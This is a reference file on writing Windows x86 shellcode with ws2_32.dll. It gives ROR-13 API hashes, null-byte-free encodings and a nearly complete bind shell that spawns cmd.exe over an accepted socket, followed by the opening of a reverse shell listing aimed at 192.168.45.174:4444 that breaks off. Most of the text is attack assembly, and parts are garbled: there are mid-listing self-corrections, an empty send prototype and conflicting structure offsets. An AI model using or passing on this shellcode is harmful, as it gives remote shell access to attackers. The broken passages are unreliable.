# ws2_32.dll — Windows Sockets 2 API Reference for Shellcode

**DLL:** `ws2_32.dll`
**Base path:** `C:\Windows\System32\ws2_32.dll`
**Calling convention (x86):** `__stdcall` — callee cleans the stack; arguments pushed right-to-left.
**Calling convention (x64):** `__fastcall` — first four args in `RCX`, `RDX`, `R8`, `R9`; rest on stack.
**Relevant shellcode types:** Bind shell, reverse shell, staged payload stagers.

> Cross-references: `kernel32.md` (CreateProcessA, GetCurrentProcess, CloseHandle), `ntdll.md` (PEB walk, hash-based function resolution).

## Loading ws2_32.dll in Shellcode

Unlike `kernel32.dll`, `ws2_32.dll` is **not** guaranteed to be loaded in every process at startup. Before resolving any WinSock function, the shellcode must load the DLL explicitly using `LoadLibraryA` (resolved from `kernel32.dll` via PEB walk).

```nasm
; After resolving LoadLibraryA into EBP (or calling via EDI table):
xor  eax, eax
push eax               ; null terminator
push 0x5F325F73        ; "s_2_" (reversed: _2_s)  -- actually ws2_32
; More common: use the full string approach below

; Push "ws2_32\x00\x00" onto the stack
xor  eax, eax
push eax               ; null terminator (2 bytes of padding + null)
push 0x00003233        ; "23\x00\x00"  -> careful with null bytes
; Null-byte-free approach using XOR:
mov  eax, 0x61623334   ; garbage
xor  eax, 0x61623334   ; eax = 0
; Cleaner: push the string as DWORDs
push 0x00003233        ; "23"  -- has null bytes, avoid in actual shellcode
```

**Null-byte-free string push for "ws2_32":**

```nasm
; "ws2_32\x00" = 77 73 32 5F 33 32 00
; Push in reverse as DWORDs, use XOR to avoid embedded nulls:
xor  ecx, ecx
push ecx               ; null terminator
push 0x6C6C642E        ; XOR key trick if needed
; Practical approach used in msfvenom and similar:
; mov dword [esp-4], 0x5F327377  ; "ws2_"
; mov dword [esp-8], 0x00003233  ; "32\x00\x00"
; sub esp, 8
; -- OR --
; Encode as XOR to avoid the null in "32\x00\x00":
xor  eax, eax
push eax               ; will become the null terminator
push 0x5F327377        ; "ws2_" (little-endian: 77 73 32 5F)
mov  eax, 0x33320101   ; "32\x01\x01" -- no null bytes
sub  ax, 0x0101        ; eax = 0x33320000 -- but still has nulls
; Simplest real approach: use a helper that increments/decrements
```

**Most common shellcode idiom (from msfvenom/metasploit stubs):**

```nasm
; resolve LoadLibraryA first (from kernel32 via PEB walk)
; then:
push 0x00003233        ; NOTE: has null byte — acceptable in some contexts
push 0x5F327377        ; "ws2_"
push esp               ; lpLibFileName = "ws2_32\x00"
call [ebp + LoadLibraryA_offset]
; EAX = base of ws2_32.dll
```

In position-independent shellcode that must avoid null bytes, the DLL name is XOR-encoded or the bytes are assembled via arithmetic.

## ROR-13 Hash Reference

These are the standard ROR-13 hashes used by PEB-walk shellcode stubs (e.g., the Metasploit `block_api` routine). Each hash is the ROR-13 hash of the ASCII function name concatenated with the ROR-13 hash of the module name (some implementations hash function name only — verify against the stub you are using).

| Function | ROR-13 Hash (function name only) |
|---|---|
| `WSAStartup` | `0x006B8029` |
| `WSASocketA` | `0xE0DF0FEA` |
| `bind` | `0x6737DBC2` |
| `listen` | `0xFF38E9B7` |
| `accept` | `0xE13BEC74` |
| `WSAConnect` | `0x6174A599` |
| `connect` | `0x60AAF9EC` |
| `recv` | `0xE71819B5` |
| `send` | `0x1B492BB3` |
| `closesocket` | `0x614D6E75` |

**How ROR-13 is computed (Python):**

```python
import struct

def ror13(val, bits=32):
    return ((val >> 13) | (val << (bits - 13))) & 0xFFFFFFFF

def hash_name(name: str) -> int:
    h = 0
    for ch in name:
        h = ror13(h)
        h = (h + ord(ch)) & 0xFFFFFFFF
    return h

print(hex(hash_name("WSAStartup")))   # 0x6b8029  (leading zero for the DWORD)
print(hex(hash_name("WSASocketA")))   # 0xe0df0fea
print(hex(hash_name("bind")))         # 0x6737dbc2
```

**Calling via the block_api stub (x86):**

```nasm
; Assumes block_api stub is at [ebp+0] or EBP points to the API caller.
; Push the hash, then call:
push 0xE0DF0FEA        ; hash for WSASocketA
call ebp               ; invokes block_api resolver
; EAX = address of WSASocketA on return
```

## Structure Layouts

### WSADATA Structure

`WSAStartup` fills a `WSADATA` structure that the caller provides. On x86 Windows, this structure is **400 bytes** (0x190 bytes). The shellcode does not need to interpret its contents — it just needs a writable buffer large enough.

```c
typedef struct WSAData {
    WORD    wVersion;         // +0x00  version negotiated
    WORD    wHighVersion;     // +0x02  highest version supported
    char    szDescription[257]; // +0x04  256 chars + null
    char    szSystemStatus[129]; // +0x105 128 chars + null
    unsigned short iMaxSockets; // +0x186 (ignored in Winsock 2)
    unsigned short iMaxUdpDg;   // +0x188 (ignored in Winsock 2)
    char FAR *lpVendorInfo;   // +0x18A (ignored in Winsock 2)
    // Total: ~400 bytes on x86
} WSADATA;
```

**Stack allocation in shellcode:**

```nasm
; Allocate 0x190 (400) bytes on the stack for WSADATA.
; 0x200 (512) is the commonly used value — slightly over-allocates,
; which is fine and provides alignment safety.
sub esp, 0x200         ; reserve stack space for WSADATA
mov edi, esp           ; EDI = pointer to WSADATA buffer
```

You do **not** need to zero out the buffer before calling `WSAStartup`; the function overwrites it entirely.

### sockaddr_in Structure

Used for `bind`, `accept`, `connect`, and `WSAConnect`. Exactly **16 bytes**.

```c
struct sockaddr_in {
    short          sin_family;   // +0x00  2 bytes: AF_INET = 0x0002
    unsigned short sin_port;     // +0x02  2 bytes: port in NETWORK byte order (big-endian)
    struct in_addr sin_addr;     // +0x04  4 bytes: IP in network byte order
    char           sin_zero[8];  // +0x08  8 bytes: must be zero
};
// Total: 16 bytes
```

**Memory layout (bind shell, port 4444, any address):**

```
Offset  Size  Value       Meaning
+0x00   2     02 00       sin_family = AF_INET (2), little-endian WORD = 0x0002
+0x02   2     5C 11       sin_port = htons(4444) = 0x115C, stored big-endian
+0x04   4     00 00 00 00 sin_addr = INADDR_ANY (0.0.0.0)
+0x08   8     00 00 00 00 sin_zero (padding, must be zero)
       00 00 00 00
```

**Memory layout (reverse shell, port 4444, IP 192.168.45.174):**

```
Offset  Size  Value       Meaning
+0x00   2     02 00       sin_family = AF_INET
+0x02   2     5C 11       sin_port = htons(4444)
+0x04   4     C0 A8 2D AE sin_addr = 192.168.45.174 in network byte order
+0x08   8     00 00 ...   sin_zero
```

### Port and IP Encoding

#### Port encoding — `htons()`

WinSock functions expect `sin_port` in **network byte order** (big-endian). x86 is little-endian, so the bytes are swapped from how you might expect:

```
Port 4444 decimal = 0x115C hex

As a WORD in network byte order (big-endian): bytes in memory = 11 5C
As a WORD in host byte order (little-endian):  bytes in memory = 5C 11

The WORD value you push onto the x86 stack:  0x5C11
(because x86 stores little-endian: push 0x5C11 → mem: 11 5C = correct network order)
```

Wait — let's be precise. When you `push 0x00005C11` as a DWORD on x86:
- Memory at `[esp]` = `11 5C 00 00` (little-endian DWORD)
- `sockaddr_in.sin_port` is the WORD at `[esp+2]` of the structure...

In practice, the `sockaddr_in` is typically built as two DWORDs:

```nasm
; Build sockaddr_in on the stack (bind shell, port 4444, INADDR_ANY):
xor  eax, eax
push eax               ; sin_zero[4..7] = 0x00000000
push eax               ; sin_zero[0..3] = 0x00000000
push eax               ; sin_addr       = INADDR_ANY (0.0.0.0)
push word 0x5C11       ; sin_port = 0x115C in network order (htons(4444))
                       ; BUT sin_family must follow immediately!
; More common: combine sin_family and sin_port into one DWORD push:
push 0x00005C11        ; sin_port = htons(4444) = 0x115C [bytes: 11 5C]
                       ; sin_family padding... this is WRONG — see below
```

**Correct approach — combine `sin_family` and `sin_port` as a DWORD:**

```nasm
; sockaddr_in is 16 bytes. Build it right-to-left on the stack:
xor  eax, eax
push eax               ; +0x0C: sin_zero[4] (4 bytes of 0x00)
push eax               ; +0x08: sin_zero[0] (4 bytes of 0x00)
push eax               ; +0x04: sin_addr = INADDR_ANY = 0x00000000
push word  0x5C11      ; +0x02: sin_port = htons(4444), WORD push (2 bytes)
push word  0x0002      ; +0x00: sin_family = AF_INET = 2, WORD push (2 bytes)
mov  esi, esp          ; ESI = pointer to sockaddr_in
```

Alternatively, use a single DWORD for the combined `sin_family`/`sin_port` field:

```nasm
; The 4-byte DWORD at offset +0x00 of sockaddr_in contains:
;   [byte 0] = sin_family low byte  = 0x02
;   [byte 1] = sin_family high byte = 0x00
;   [byte 2] = sin_port high byte   = 0x11  (network order MSB)
;   [byte 3] = sin_port low byte    = 0x5C  (network order LSB)
;
; As a little-endian DWORD to push: 0x5C110002
push 0x00000000        ; sin_addr = INADDR_ANY
push 0x00000000        ; sin_zero (first 4 bytes)
push 0x00000000        ; sin_zero (last 4 bytes)  -- push order matters!
; Actually build bottom-up since stack grows downward:
xor  eax, eax
push eax               ; sin_zero (bytes 12-15 of structure = last 4)
push eax               ; sin_zero (bytes 8-11)
push eax               ; sin_addr (bytes 4-7) = INADDR_ANY
push 0x5C110002        ; sin_family + sin_port (bytes 0-3)
```

**Port 80 (HTTP) — avoiding null bytes:**

```nasm
; htons(80) = 0x5000. The DWORD for sin_family+sin_port would be 0x50000002,
; which contains null bytes (0x00). Use XOR encoding:
mov  eax, 0x50000002   ; desired value
xor  eax, 0x01010101   ; eax = 0x51010103 — no null bytes
push eax               ; push encoded value
; BUT: then the pushed value is wrong. You need to XOR *before* the push
; and arrange for the actual bytes to be correct in memory.
; A cleaner trick: push a dummy DWORD, then patch it via XOR on the stack.
push 0x51010103        ; push no-null-byte value
xor  dword [esp], 0x01010101  ; patch in place: result = 0x50000002 ✓
```

#### IP Address encoding

```
IP: 192.168.45.174
Octets (decimal):   192   168    45   174
Octets (hex):       0xC0  0xA8  0x2D  0xAE

Network byte order (big-endian, bytes in memory): C0 A8 2D AE
The DWORD value to push on x86 (little-endian):  0xAE2DA8C0
(because push 0xAE2DA8C0 → memory: C0 A8 2D AE = network order ✓)
```

```python
import socket, struct
ip = "192.168.45.174"
packed = socket.inet_aton(ip)          # b'\xc0\xa8\x2d\xae'
dword  = struct.unpack("<I", packed)[0] # 0xAE2DA8C0 — the DWORD to push
print(hex(dword))                       # 0xae2da8c0
```

**Common IPs and their push DWORDs:**

| IP | Network bytes | DWORD to push |
|---|---|---|
| `127.0.0.1` | `7F 00 00 01` | `0x0100007F` (has null — needs encoding) |
| `192.168.1.1` | `C0 A8 01 01` | `0x010168C0` (has `0x01` bytes, OK; no null) |
| `10.0.0.1` | `0A 00 00 01` | `0x0100000A` (null bytes — needs encoding) |
| `192.168.45.174` | `C0 A8 2D AE` | `0xAE2DA8C0` (no null bytes ✓) |

## Function Reference

### WSAStartup

**Prototype:**

```c
int WSAStartup(
    WORD      wVersionRequested,  // [in]  version requested
    LPWSADATA lpWSAData           // [out] pointer to WSADATA buffer
);
```

**Purpose:** Initializes the WinSock library for use by the calling process. **Must be called before any other WinSock function.** Sets up internal state and negotiates the WinSock version.

**Key parameters:**

| Parameter | Type | Value used in shellcode | Notes |
|---|---|---|---|
| `wVersionRequested` | `WORD` | `0x0202` | `MAKEWORD(2,2)` = WinSock 2.2 |
| `lpWSAData` | `LPWSADATA` | `ESP` (stack buffer) | Pointer to 400-byte buffer |

**Return value:**
- `0` on success.
- Non-zero error code on failure (**not** retrievable via `WSAGetLastError` — the return value itself is the error).
- Common errors: `WSASYSNOTREADY (0x276D)`, `WSAVERNOTSUPPORTED (0x276E)`, `WSAEINPROGRESS (0x2728)`.

> **Critical:** Unlike most WinSock functions, `WSAStartup` error information is in the return value, not in `WSAGetLastError`. Shellcode typically skips error checking to save bytes.

**Calling convention stack frame (x86 stdcall):**

```
[ESP+4]  = wVersionRequested (WORD, passed as DWORD)
[ESP+8]  = lpWSAData (pointer)
```

**x86 push sequence:**

```nasm
; Allocate WSADATA buffer on stack first
sub  esp, 0x190        ; 400 bytes for WSADATA (0x190 = 400 decimal)
push esp               ; lpWSAData = pointer to buffer
push 0x0202            ; wVersionRequested = MAKEWORD(2,2) = 2.2
call [ebp + WSAStartup_offset]   ; or: call esi where esi resolved via hash
; On return: EAX = 0 if success
; Stack is callee-cleaned (stdcall): ESP is restored by the function
; BUT: our sub esp, 0x190 remains — the WSADATA buffer is still allocated
```

**Shellcode pattern (with hash resolution):**

```nasm
sub  esp, 0x190        ; reserve WSADATA buffer
mov  edi, esp          ; save pointer to WSADATA

push esp               ; lpWSAData
push 0x00000202        ; wVersionRequested = 2.2
push 0x006B8029        ; hash for WSAStartup
call ebp               ; block_api resolver
; EAX = 0 on success
```

**ROR-13 hash:** `0x006B8029`

### WSASocketA

**Prototype:**

```c
SOCKET WSASocketA(
    int                 af,              // [in] address family
    int                 type,            // [in] socket type
    int                 protocol,        // [in] protocol
    LPWSAPROTOCOL_INFOA lpProtocolInfo,  // [in] NULL in shellcode
    GROUP               g,               // [in] 0 (no group)
    DWORD               dwFlags          // [in] 0 (no special flags)
);
```

**Purpose:** Creates a socket with more control than the legacy `socket()` function. Preferred in shellcode because it supports the `WSA_FLAG_OVERLAPPED` flag (though shellcode sets `dwFlags=0`).

**Key parameters:**

| Parameter | Type | Value | Meaning |
|---|---|---|---|
| `af` | `int` | `2` | `AF_INET` — IPv4 |
| `type` | `int` | `1` | `SOCK_STREAM` — TCP |
| `protocol` | `int` | `6` | `IPPROTO_TCP` |
| `lpProtocolInfo` | `LPWSAPROTOCOL_INFOA` | `NULL (0)` | No protocol info |
| `g` | `GROUP` | `0` | No socket group |
| `dwFlags` | `DWORD` | `0` | No overlapped I/O |

**Return value:**
- On success: a `SOCKET` handle (a `UINT_PTR` — on x86 it fits in a register). Typically saved in `ESI` or `EBX`.
- On failure: `INVALID_SOCKET = 0xFFFFFFFF` (i.e., `-1` when interpreted as signed).

> **Note:** `SOCKET` is `unsigned int` on x86 (32-bit). `INVALID_SOCKET` = `(SOCKET)(~0)` = `0xFFFFFFFF`. Do NOT check for `NULL` (0) — a socket value of 0 is theoretically valid (though rare in practice).

**x86 push sequence:**

```nasm
xor  eax, eax
push eax               ; dwFlags = 0
push eax               ; g = 0
push eax               ; lpProtocolInfo = NULL
push 6                 ; protocol = IPPROTO_TCP
push 1                 ; type = SOCK_STREAM
push 2                 ; af = AF_INET
push 0xE0DF0FEA        ; hash for WSASocketA
call ebp               ; resolve and call
mov  esi, eax          ; save SOCKET handle in ESI (common convention)
```

**ROR-13 hash:** `0xE0DF0FEA`

### bind

**Prototype:**

```c
int bind(
    SOCKET         s,       // [in] socket handle
    const sockaddr *name,   // [in] pointer to sockaddr_in
    int            namelen  // [in] size of sockaddr structure = 16
);
```

**Purpose:** Associates a socket with a local port number and address. Required for bind-shell payloads before calling `listen`.

**Key parameters:**

| Parameter | Type | Value | Notes |
|---|---|---|---|
| `s` | `SOCKET` | `ESI` (socket handle) | From `WSASocketA` |
| `name` | `const sockaddr*` | pointer to `sockaddr_in` on stack | Contains port and address |
| `namelen` | `int` | `16` | `sizeof(struct sockaddr_in)` |

**Return value:**
- `0` on success.
- `SOCKET_ERROR (-1 = 0xFFFFFFFF)` on failure; call `WSAGetLastError` for details.

**Common error codes (via WSAGetLastError):**
- `WSAEADDRINUSE (0x2740)` — port already in use.
- `WSAEINVAL (0x2726)` — socket already bound.

**x86 push sequence (full sockaddr_in + bind call):**

```nasm
; Build sockaddr_in on the stack (port 4444, INADDR_ANY)
xor  eax, eax
push eax               ; sin_zero[4..7]
push eax               ; sin_zero[0..3]
push eax               ; sin_addr = INADDR_ANY (0.0.0.0)
push 0x5C110002        ; sin_port = htons(4444) [0x115C] + sin_family = AF_INET [0x0002]
mov  ebx, esp          ; EBX = &sockaddr_in

; Call bind
push 16                ; namelen = sizeof(sockaddr_in)
push ebx               ; name = &sockaddr_in
push esi               ; s = socket handle
push 0x6737DBC2        ; hash for bind
call ebp
; EAX = 0 on success
```

**ROR-13 hash:** `0x6737DBC2`

### listen

**Prototype:**

```c
int listen(
    SOCKET s,       // [in] bound socket
    int    backlog  // [in] maximum pending connection queue length
);
```

**Purpose:** Marks the socket as passive — ready to accept incoming connections via `accept`. Must be called after `bind`.

**Key parameters:**

| Parameter | Type | Value | Notes |
|---|---|---|---|
| `s` | `SOCKET` | socket handle | From `WSASocketA` |
| `backlog` | `int` | `2` or `0x7FFFFFFF` | `SOMAXCONN = 0x7FFFFFFF` for maximum queue |

> **Note:** `SOMAXCONN` (`0x7FFFFFFF`) tells WinSock to use the implementation maximum. For a single-connection bind shell, `backlog=2` is sufficient and avoids the large constant. Some shellcode uses `backlog=1`.

**Return value:**
- `0` on success.
- `SOCKET_ERROR (-1)` on failure.

**x86 push sequence:**

```nasm
push 2                 ; backlog (could also push 0x7FFFFFFF for SOMAXCONN)
push esi               ; s = socket handle
push 0xFF38E9B7        ; hash for listen
call ebp
```

**ROR-13 hash:** `0xFF38E9B7`

### accept

**Prototype:**

```c
SOCKET accept(
    SOCKET   s,        // [in]      listening socket
    sockaddr *addr,    // [out]     receives peer address (can be NULL)
    int      *addrlen  // [in/out]  address of length variable (can be NULL)
);
```

**Purpose:** Extracts the first pending connection from the listening socket's queue and creates a **new** socket for that connection. The original socket `s` remains listening. **Blocks** until a connection arrives (synchronous I/O).

**Key parameters:**

| Parameter | Type | Value in shellcode | Notes |
|---|---|---|---|
| `s` | `SOCKET` | socket handle (ESI) | The listening socket |
| `addr` | `sockaddr*` | `NULL (0)` | Don't care about peer address |
| `addrlen` | `int*` | `NULL (0)` | Don't care about address length |

**Return value:**
- On success: a **new** `SOCKET` handle for the accepted connection. This is the socket used for shell I/O (passed to `CreateProcessA` as `STARTUPINFO.hStdInput/Output/Error`).
- On failure: `INVALID_SOCKET (0xFFFFFFFF)`.

> **Key point:** The socket returned by `accept` — not the original listening socket — is what you pass to `CreateProcessA` for stdin/stdout/stderr. Save it separately (common convention: original socket in `ESI`, accepted client socket in `EDI` or `EBX`).

**x86 push sequence:**

```nasm
xor  eax, eax
push eax               ; addrlen = NULL
push eax               ; addr = NULL
push esi               ; s = listening socket handle
push 0xE13BEC74        ; hash for accept
call ebp
mov  edi, eax          ; save client socket handle in EDI
```

**ROR-13 hash:** `0xE13BEC74`

### WSAConnect

**Prototype:**

```c
int WSAConnect(
    SOCKET          s,            // [in] unconnected socket
    const sockaddr *name,         // [in] remote address (sockaddr_in)
    int             namelen,      // [in] 16
    LPWSABUF        lpCallerData, // [in] NULL
    LPWSABUF        lpCalleeData, // [in] NULL
    LPQOS           lpSQOS,       // [in] NULL
    LPQOS           lpGQOS        // [in] NULL
);
```

**Purpose:** Connects a socket to a remote address (reverse shell). Extended version of `connect` with quality-of-service parameters — all of which are `NULL` in shellcode. The extra parameters make `WSAConnect` preferable in some shellcode because the additional NULLs can be pushed with a loop, keeping the code smaller/more uniform.

**Key parameters:**

| Parameter | Type | Value | Notes |
|---|---|---|---|
| `s` | `SOCKET` | socket handle | From `WSASocketA` |
| `name` | `const sockaddr*` | `&sockaddr_in` | Contains attacker IP and port |
| `namelen` | `int` | `16` | `sizeof(sockaddr_in)` |
| `lpCallerData` | `LPWSABUF` | `NULL` | Not used |
| `lpCalleeData` | `LPWSABUF` | `NULL` | Not used |
| `lpSQOS` | `LPQOS` | `NULL` | Not used |
| `lpGQOS` | `LPQOS` | `NULL` | Not used |

**Return value:**
- `0` on success (connection established).
- `SOCKET_ERROR (-1)` on failure; `WSAGetLastError` returns `WSAECONNREFUSED (0x274D)` if nobody is listening.

**Reverse shell `sockaddr_in` (port 4444, IP 192.168.45.174):**

```nasm
; IP: 192.168.45.174 = 0xC0A82DAE
; DWORD to push: 0xAE2DA8C0 (little-endian → network byte order in memory)
; Port: htons(4444) = 0x115C
; DWORD for sin_family + sin_port: 0x5C110002

xor  eax, eax
push eax               ; sin_zero[4..7]
push eax               ; sin_zero[0..3]
push 0xAE2DA8C0        ; sin_addr = 192.168.45.174 in network order
push 0x5C110002        ; sin_port + sin_family
mov  ebx, esp          ; EBX = &sockaddr_in

xor  eax, eax
push eax               ; lpGQOS = NULL
push eax               ; lpSQOS = NULL
push eax               ; lpCalleeData = NULL
push eax               ; lpCallerData = NULL
push 16                ; namelen = sizeof(sockaddr_in)
push ebx               ; name = &sockaddr_in
push esi               ; s = socket handle
push 0x6174A599        ; hash for WSAConnect
call ebp
```

**ROR-13 hash:** `0x6174A599`

### connect

**Prototype:**

```c
int connect(
    SOCKET         s,       // [in] unconnected socket
    const sockaddr *name,   // [in] remote address
    int            namelen  // [in] size of address structure
);
```

**Purpose:** Simpler alternative to `WSAConnect`. Connects a socket to a remote address. Used in reverse shell shellcode. Three arguments vs. `WSAConnect`'s seven.

**Return value:**
- `0` on success.
- `SOCKET_ERROR (-1)` on failure.

**WSAConnect vs. connect — when to use which:**

| Criterion | `connect` | `WSAConnect` |
|---|---|---|
| Args | 3 | 7 |
| Stack setup | Simpler | 4 extra NULLs |
| Code size | Smaller | Larger |
| Null bytes in hashes | `0x60AAF9EC` | `0x6174A599` |
| Usage | Compact shellcode | Metasploit stubs, uniformity |

**x86 push sequence:**

```nasm
; Build sockaddr_in (same as above)
xor  eax, eax
push eax
push eax
push 0xAE2DA8C0        ; sin_addr
push 0x5C110002        ; sin_port + sin_family
mov  ebx, esp

push 16                ; namelen
push ebx               ; name
push esi               ; s
push 0x60AAF9EC        ; hash for connect
call ebp
```

**ROR-13 hash:** `0x60AAF9EC`

### recv

**Prototype:**

```c
int recv(
    SOCKET s,     // [in]  connected socket
    char  *buf,   // [out] receive buffer
    int    len,   // [in]  buffer length
    int    flags  // [in]  0 for normal operation
);
```

**Purpose:** Receives data from a connected socket. In simple bind/reverse shell shellcode, `recv`/`send` are **not** called directly — instead, `CreateProcessA` is invoked with the socket handle set as `hStdInput`/`hStdOutput`/`hStdError` in `STARTUPINFO`, and the `cmd.exe` process inherits the socket, performing I/O directly. `recv`/`send` appear in custom interactive shell loops or stager payloads.

**Return value:**
- Number of bytes received (`> 0`) on success.
- `0` if the connection was gracefully closed.
- `SOCKET_ERROR (-1)` on error.

**x86 push sequence:**

```nasm
xor  eax, eax
push eax               ; flags = 0
push 0x1000            ; len = 4096 bytes (adjust as needed)
push ebx               ; buf = receive buffer pointer
push esi               ; s = socket handle
push 0xE71819B5        ; hash for recv
call ebp
; EAX = bytes received, or 0 (closed), or -1 (error)
```

**ROR-13 hash:** `0xE71819B5`

### send

**Prototype:**

```c
int send(

);
```

**Purpose:** Sends data on a connected socket. Like `recv`, rarely used directly in simple shell shellcode — `CreateProcessA` with inherited socket handles handles I/O. More common in staged shellcode that sends the stage download request.

**Return value:**

- `SOCKET_ERROR (-1)` on failure.

**x86 push sequence:**

```nasm
xor  eax, eax
push eax               ; flags = 0

push edx               ; buf = pointer to data
push esi               ; s = socket handle
push 0x1B492BB3        ; hash for send
```

## Complete Bind Shell WinSock Sequence

This assembly listing shows the full WinSock portion of an x86 bind shell shellcode. The `block_api` stub is assumed to be at the address in `EBP`. `CreateProcessA` is from `kernel32.dll` — see `kernel32.md` for its usage.

```nasm
; ============================================================
; x86 Bind Shell — WinSock Sequence
; Assumptions:
;   EBP = address of block_api stub (hash-based resolver)
;   Target: Windows x86, port 4444
; ============================================================

; ---- Step 1: Load ws2_32.dll ----
xor  eax, eax
push eax               ; null terminator
push 0x5F327377        ; "ws2_"
push 0x00003233        ; "32\x00" — note: has null byte (encode if needed)
; In null-byte-free shellcode, use XOR trick here
push esp               ; lpLibFileName = "ws2_32"
push 0x0726774C        ; hash for LoadLibraryA (kernel32)
call ebp               ; EAX = handle to ws2_32.dll
; ws2_32.dll is now loaded; block_api can resolve its exports

; ---- Step 2: WSAStartup(0x0202, &wsadata) ----
sub  esp, 0x190        ; allocate 400 bytes for WSADATA on stack
push esp               ; lpWSAData = pointer to buffer
push 0x00000202        ; wVersionRequested = MAKEWORD(2,2)
push 0x006B8029        ; hash for WSAStartup
call ebp               ; EAX = 0 on success (error NOT in WSAGetLastError)
; Note: the WSADATA buffer at [esp] is now populated; we don't need it

; ---- Step 3: WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0) ----
xor  eax, eax
push eax               ; dwFlags = 0
push eax               ; g = 0
push eax               ; lpProtocolInfo = NULL
push 6                 ; protocol = IPPROTO_TCP
push 1                 ; type = SOCK_STREAM
push 2                 ; af = AF_INET
push 0xE0DF0FEA        ; hash for WSASocketA
call ebp
; EAX = SOCKET handle (0xFFFFFFFF = INVALID_SOCKET on failure)
mov  esi, eax          ; ESI = listening socket

; ---- Step 4: Build sockaddr_in for bind() ----
; Port 4444 = 0x115C; htons(4444) = 0x5C11 → DWORD with sin_family: 0x5C110002
xor  eax, eax
push eax               ; sin_zero[4..7] = 0
push eax               ; sin_zero[0..3] = 0
push eax               ; sin_addr = INADDR_ANY (0.0.0.0)
push 0x5C110002        ; sin_port=htons(4444) | sin_family=AF_INET
mov  ebx, esp          ; EBX = &sockaddr_in

; ---- Step 5: bind(socket, &sockaddr_in, 16) ----
push 16                ; namelen = sizeof(sockaddr_in)
push ebx               ; name = &sockaddr_in
push esi               ; s = socket handle
push 0x6737DBC2        ; hash for bind
call ebp               ; EAX = 0 on success

; ---- Step 6: listen(socket, 2) ----
push 2                 ; backlog = 2
push esi               ; s = socket handle
push 0xFF38E9B7        ; hash for listen
call ebp               ; EAX = 0 on success

; ---- Step 7: accept(socket, NULL, NULL) ---- [BLOCKING CALL]
xor  eax, eax
push eax               ; addrlen = NULL
push eax               ; addr = NULL
push esi               ; s = listening socket
push 0xE13BEC74        ; hash for accept
call ebp               ; BLOCKS until connection arrives
; EAX = new SOCKET handle for the accepted connection
mov  edi, eax          ; EDI = client socket (used for cmd.exe I/O)

; ---- Step 8: Set up STARTUPINFO for CreateProcessA ----
; STARTUPINFO is 68 bytes on x86. We build it on the stack.
; Key fields:
;   cb          (DWORD) = 68 (sizeof STARTUPINFO)
;   dwFlags     (DWORD) = STARTF_USESTDHANDLES (0x100)
;   hStdInput   (HANDLE) = client socket (EDI)
;   hStdOutput  (HANDLE) = client socket (EDI)
;   hStdError   (HANDLE) = client socket (EDI)
; All other fields = 0.

xor  eax, eax
push edi               ; hStdError = client socket
push edi               ; hStdOutput = client socket
push edi               ; hStdInput = client socket
push eax               ; cbReserved2 = 0; lpReserved2 = NULL (2 WORDs + ptr)
push eax               ; wShowWindow = 0; wShowWindow high = 0
push eax               ; dwFillAttribute = 0
push eax               ; dwYCountChars = 0
push eax               ; dwXCountChars = 0
push eax               ; dwYSize = 0
push eax               ; dwXSize = 0
push eax               ; dwY = 0
push eax               ; dwX = 0
push eax               ; lpTitle = NULL
push eax               ; lpDesktop = NULL
push eax               ; lpReserved = NULL
push 0x00000100        ; dwFlags = STARTF_USESTDHANDLES
push 44                ; cb = sizeof(STARTUPINFO) = 44 + 24 = 68... adjust
; Note: STARTUPINFO on x86 is 68 bytes total. Push in reverse field order.
; A common shortcut is to use 'push eax' to zero 60 bytes, then patch cb and dwFlags:
;   sub esp, 44         ; space for fields[1..11] (zeros)
;   mov [esp+44], 0x44  ; cb = 68 (0x44)
;   mov [esp+28], 0x100 ; dwFlags = STARTF_USESTDHANDLES
;   mov [esp+56], edi   ; hStdInput
;   mov [esp+60], edi   ; hStdOutput
;   mov [esp+64], edi   ; hStdError

; Cleaner: allocate and zero-fill, then set fields
mov  ecx, 0x11         ; 17 DWORDs = 68 bytes
zero_startupinfo:
push eax               ; push 0
loop zero_startupinfo
mov  ebx, esp          ; EBX = &STARTUPINFO
mov  byte [ebx], 0x44  ; cb = 68 (sizeof STARTUPINFO)
mov  word [ebx+28], 0x0101 ; dwFlags = STARTF_USESTDHANDLES (0x100) — use 0x0101 to avoid 0x00 byte
; Correction: 0x100 in little-endian = bytes [00 01 00 00] — has null bytes
; XOR trick:
xor  edx, edx
inc  edx               ; EDX = 1
shl  edx, 8            ; EDX = 0x100 = STARTF_USESTDHANDLES
mov  [ebx+44], edx     ; dwFlags = 0x100
; (field offset: cb=0, lpReserved=4, lpDesktop=8, lpTitle=12, dwX=16, dwY=20,
;  dwXSize=24, dwYSize=28, dwXCountChars=32, dwYCountChars=36, dwFillAttribute=40,
;  dwFlags=44, wShowWindow=48, cbReserved2=50, lpReserved2=52, hStdInput=56,
;  hStdOutput=60, hStdError=64)
mov  [ebx+56], edi     ; hStdInput = client socket
mov  [ebx+60], edi     ; hStdOutput = client socket
mov  [ebx+64], edi     ; hStdError = client socket

; ---- Step 9: Build "cmd\x00" string ----
; "cmd" = 63 6D 64 00
mov  edx, 0x646D6301   ; "cmd\x01" — no null byte
sub  dl, 1             ; edx = 0x646D6300 = "cmd\x00"
push edx
mov  ecx, esp          ; ECX = pointer to "cmd\x00"

; ---- Step 10: Allocate PROCESS_INFORMATION ----
sub  esp, 16           ; sizeof(PROCESS_INFORMATION) = 16 bytes
mov  edx, esp          ; EDX = &PROCESS_INFORMATION

; ---- Step 11: CreateProcessA ----
push edx               ; lpProcessInformation = &PROCESS_INFORMATION
push ebx               ; lpStartupInfo = &STARTUPINFO
xor  eax, eax
push eax               ; lpCurrentDirectory = NULL
push eax               ; lpEnvironment = NULL
push eax               ; dwCreationFlags = 0
push 1                 ; bInheritHandles = TRUE (must be TRUE for socket inheritance)
push eax               ; lpThreadAttributes = NULL
push eax               ; lpProcessAttributes = NULL
push ecx               ; lpCommandLine = "cmd\x00"
push eax               ; lpApplicationName = NULL
push 0x863FCC79        ; hash for CreateProcessA (kernel32) — see kernel32.md
call ebp

; ---- Step 12: WaitForSingleObject (wait for cmd.exe to exit) ----
push 0xFFFFFFFF        ; dwMilliseconds = INFINITE
; (get hProcess from PROCESS_INFORMATION.hProcess = [EDX+0])
push dword [edx]       ; hHandle = hProcess
push 0x601D8708        ; hash for WaitForSingleObject (kernel32)
call ebp
```

```nasm
; Connect back to: 192.168.45.174:4444
; Assumptions: EBP = block_api stub
; ============================================================

; ---- Step 1: Load ws2_32.dll (same as bind shell) ----
; [omitted for brevity — identical to bind shell Step 1]

; ---- Step 2: WSAStartup(0x0202, &wsadata) ----
sub  esp, 0x190
